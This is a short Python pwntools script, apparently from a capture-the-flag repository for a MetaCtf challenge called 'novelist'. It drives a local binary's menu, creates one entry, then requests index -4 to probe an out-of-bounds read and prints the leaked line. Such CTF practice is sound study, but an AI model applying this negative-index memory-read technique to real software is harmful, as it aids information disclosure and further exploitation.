from pwn import *

p = process('/mnt/c/Users/Cyborg/Documents/GitHub/CTFs/MetaCtf/novelist/main')

def menu():
    p.recvuntil(b'> ')

def start():
    menu()
    p.sendline(b'1')
    p.recvuntil(b"title: ")
    p.sendline(b'A')
    p.recvuntil(b"page count: ")
    p.sendline(b'1')
    p.recvline()

start()
menu()
p.sendline(b'2')
p.recvuntil(b"index: ")
p.sendline(b'-4')
print(p.recvline())
